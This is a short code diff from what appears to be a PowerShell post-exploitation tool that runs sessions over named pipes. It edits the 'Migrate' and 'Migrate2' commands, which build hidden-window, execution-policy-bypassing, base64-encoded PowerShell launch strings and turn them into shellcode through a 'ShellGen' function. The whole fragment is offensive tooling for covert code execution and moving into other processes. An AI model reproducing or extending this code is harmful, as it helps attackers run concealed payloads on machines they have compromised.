@@ -2434,8 +2434,8 @@ function InteractWithPipeSession{
 			
 			if($global:Detach){$finalstring = "powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"}
 			else{
-				if($command -like "Migrate *"){$finalstring = "powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"}
-				elseif($command -like "Migrate2 *"){$finalstring = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"}
+				if($command -like "Migrate *"){$finalstring = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"}
+				elseif($command -like "Migrate2 *"){$finalstring = "powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"}
 			}
 			
 			$ShCodePlaceholder = ShellGen -ShCommand $finalstring
